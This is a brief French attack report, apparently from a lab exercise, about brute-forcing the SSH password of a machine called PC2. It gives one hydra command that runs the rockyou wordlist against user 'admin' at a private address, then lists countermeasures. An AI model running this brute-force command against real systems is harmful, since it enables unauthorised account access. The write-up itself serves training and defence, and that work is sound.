# SSH Brute Force - Rapport d'attaque

## Objectif
Trouver le mot de passe SSH de PC2.

## Commandes executees
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.20 ssh

## Contre-mesures
Mots de passe complexes, fail2ban, clefs SSH
